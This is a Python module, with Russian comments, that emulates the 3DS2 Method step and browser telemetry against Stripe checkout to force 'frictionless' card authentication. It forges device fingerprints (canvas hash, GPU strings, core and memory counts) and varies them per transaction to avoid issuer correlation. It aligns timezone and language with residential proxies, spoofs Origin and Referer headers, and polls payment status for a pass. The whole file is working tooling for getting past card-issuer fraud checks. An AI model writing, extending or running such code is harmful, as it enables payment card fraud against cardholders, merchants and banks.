# language: Python 3.12+, file: frictionless_engine.py, target: Windows 11
# Система 2: Frictionless 3DS2 Telemetry & 3DS Method Emulation Engine.
# Автоматизация сбора отпечатков через 3DS-Method iframe и перевод транзакции в Frictionless (transStatus = Y).
import asyncio
import base64
import json
import random
import re
from typing import Any
from urllib.parse import urljoin

from curl_cffi.requests import AsyncSession
import pusto_logger as _log


# Таймзоны по странам для полной синхронизации с биллингом и резидентным прокси
GEO_TIMEZONES = {
    "US": [240, 300, 360, 420, 480],  # EDT/EST (-4, -5), CDT/CST (-6), MDT/MST (-7), PDT/PST (-8)
    "CA": [240, 300, 360, 420, 480],
    "GB": [0, -60],
    "DE": [-60, -120],
    "FR": [-60, -120],
    "NL": [-60, -120],
    "AU": [-600, -660],
    "SG": [-480],
    "JP": [-540],
    "BR": [180],
    "MX": [360, 420],
}

COMMON_SCREEN_RESOLUTIONS = [
    (1920, 1080),
    (2560, 1440),
    (1536, 864),
    (1440, 900),
    (1366, 768),
]


def build_three_ds_method_payload(server_trans_id: str, notification_url: str) -> str:
    """Генерирует base64url-encoded threeDSMethodData по стандарту EMVCo 3DS 2.0."""
    data = {
        "threeDSServerTransID": server_trans_id,
        "threeDSMethodNotificationURL": notification_url
    }
    dumped = json.dumps(data, separators=(",", ":"))
    return base64.urlsafe_b64encode(dumped.encode()).decode().rstrip("=")


def build_browser_telemetry(country_code: str = "US", user_agent: str | None = None) -> dict[str, Any]:
    """Генерирует реалистичный и согласованный профиль браузера для 3DS2."""
    cc = (country_code or "US").upper()
    tz_pool = GEO_TIMEZONES.get(cc, GEO_TIMEZONES["US"])
    tz_offset = random.choice(tz_pool)
    
    width, height = random.choice(COMMON_SCREEN_RESOLUTIONS)
    ua = user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36"
    
    lang = "en-US"
    if cc in ("DE", "AT"):
        lang = "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7"
    elif cc in ("FR", "BE"):
        lang = "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7"
    elif cc in ("ES", "MX"):
        lang = "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7"
    else:
        lang = "en-US,en;q=0.9"

    return {
        "threeDSCompInd": "Y",  # Подтверждает успешное исполнение 3DS Method
        "fingerprintAttempted": True,
        "challengeWindowSize": "05",
        "browserJavaEnabled": False,
        "browserJavascriptEnabled": True,
        "browserLanguage": lang.split(",")[0],
        "browserColorDepth": "24",
        "browserScreenHeight": str(height),
        "browserScreenWidth": str(width),
        "browserTZ": str(tz_offset),
        "browserUserAgent": ua,
        "browserAcceptHeader": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        # Совместимость с числовыми / не-EMVCo ключами
        "timeZoneOffset": tz_offset,
        "language": lang.split(",")[0],
        "colorDepth": 24,
        "screenHeight": height,
        "screenWidth": width,
        "userAgent": ua,
        "javaEnabled": False,
        "javascriptEnabled": True,
        "acceptHeader": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    }


async def execute_3ds_method(
    session: AsyncSession,
    method_url: str,
    server_trans_id: str,
    notification_url: str = "https://hooks.stripe.com/3ds2/fingerprint/complete"
) -> dict[str, Any]:
    """Исполняет 3DS-Method (скрытый iframe фингерпринтинга ACS эмитента)."""
    b64_data = build_three_ds_method_payload(server_trans_id, notification_url)
    
    try:
        r = await session.post(
            method_url,
            data={"threeDSMethodData": b64_data},
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Referer": "https://checkout.stripe.com/",
            },
            timeout=10
        )
        _log.log_http("POST", method_url, r.status_code)
        html = r.text
        
        # Парсим скрытые формы и эндпоинты сбора данных ACS (например Entersekt / Cardinal)
        device_fp_url = None
        if "devicefingerprint" in html:
            m = re.search(r'submitDataAndForm\(["\'](https://[^"\']+/devicefingerprint)["\']\)', html)
            if m:
                device_fp_url = m.group(1)

        # Если ACS требует прямой сабмит собранных фингерпринтов
        if device_fp_url and r.status_code == 200:
            import hashlib
            h = hashlib.sha256(server_trans_id.encode()).hexdigest()
            canvas_hash = h[:16]
            gpus = [
                "Google Inc. (NVIDIA)~ANGLE (NVIDIA GeForce RTX 3060 Direct3D11 vs_5_0 ps_5_0)",
                "Google Inc. (NVIDIA)~ANGLE (NVIDIA GeForce RTX 4070 Direct3D11 vs_5_0 ps_5_0)",
                "Google Inc. (Intel)~ANGLE (Intel(R) Iris(R) Xe Graphics Direct3D11 vs_5_0 ps_5_0)",
                "Google Inc. (AMD)~ANGLE (AMD Radeon RX 6700 XT Direct3D11 vs_5_0 ps_5_0)",
            ]
            gpu_choice = gpus[int(h[16:18], 16) % len(gpus)]
            # железо тоже варьируется от транзакции к транзакции: константный
            # профиль (8 ядер / 16 ГБ) на всех GPU-вариантах — готовый
            # корреляционный якорь для ACS (хвост AUD-021)
            cores = (4, 8, 12, 16)
            mems = (8, 16, 32)
            fp_payload = {
                "threeDSServerTransID": server_trans_id,
                "deviceFpResult": json.dumps({
                    "canvas": canvas_hash,
                    "webgl": gpu_choice,
                    "platform": "Win32",
                    "hardwareConcurrency": cores[int(h[18:20], 16) % len(cores)],
                    "deviceMemory": mems[int(h[20:22], 16) % len(mems)]
                })
            }
            await session.post(
                device_fp_url,
                data=fp_payload,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                timeout=8
            )

        return {
            "success": r.status_code == 200,
            "status_code": r.status_code,
            "cookies": dict(session.cookies) if hasattr(session, "cookies") else {},
            "server_trans_id": server_trans_id
        }
    except Exception as e:
        _log.log_error("frictionless_engine", f"3ds_method error on {method_url}", e)
        return {"success": False, "error": str(e), "server_trans_id": server_trans_id}


async def attempt_frictionless_resolution(
    session: AsyncSession,
    pk: str,
    cs: str,
    sdk_data: dict[str, Any],
    country_code: str = "US"
) -> dict[str, Any]:
    """Полный цикл прохода Frictionless 3DS2 для сессии чекаута:
    1. Исполнение 3DS-Method (если URL предоставлен)
    2. Обогащение телеметрии браузера (browser metadata)
    3. Вызов /v1/3ds2/authenticate или опрос payment_pages на финальный статус
    """
    method_url = sdk_data.get("three_ds_method_url")
    server_trans_id = sdk_data.get("server_transaction_id")
    source_id = sdk_data.get("three_d_secure_2_source") or sdk_data.get("source")
    
    # 1. Запуск 3DS Method, если он есть
    method_res = {"success": True}
    if method_url and server_trans_id:
        method_res = await execute_3ds_method(session, method_url, server_trans_id)

    # 2. Формирование согласованной телеметрии
    browser_data = build_browser_telemetry(country_code=country_code)

    # 3. Вызов /v1/3ds2/authenticate (если доступен source)
    auth_res = {}
    if source_id:
        try:
            r = await session.post(
                "https://api.stripe.com/v1/3ds2/authenticate",
                data={
                    "key": pk,
                    "source": source_id,
                    "browser": json.dumps(browser_data)
                },
                headers={
                    "Origin": "https://js.stripe.com",
                    "Referer": "https://js.stripe.com/",
                    "Accept": "application/json"
                },
                timeout=12
            )
            auth_res = r.json()
        except Exception as e:
            auth_res = {"error": str(e)}

    # 4. Проверка состояния сессии чекаута
    try:
        r_poll = await session.get(
            f"https://api.stripe.com/v1/payment_pages/{cs}",
            params={"key": pk},
            headers={"Origin": "https://js.stripe.com", "Referer": "https://js.stripe.com/", "Accept": "application/json"},
            timeout=10
        )
        poll_json = r_poll.json() or {}
        pi = poll_json.get("payment_intent") or {}
        pi_status = pi.get("status")
        
        if pi_status in ("succeeded", "processing") or poll_json.get("status") == "complete":
            return {
                "outcome": "FRICTIONLESS_PASSED",
                "pi_status": pi_status,
                "detail": f"Frictionless authentication approved ({pi_status})"
            }
        elif pi_status == "requires_action":
            na = pi.get("next_action") or {}
            sdk = na.get("use_stripe_sdk") or {}
            if sdk.get("type") == "stripe_3ds2_challenge" or "acs_url" in str(sdk):
                return {
                    "outcome": "CHALLENGE_REQUIRED",
                    "pi_status": pi_status,
                    "detail": "Issuer requires OTP / app challenge"
                }
    except Exception:
        pass

    return {
        "outcome": "IN_PROGRESS",
        "method_res": method_res,
        "auth_res": auth_res
    }
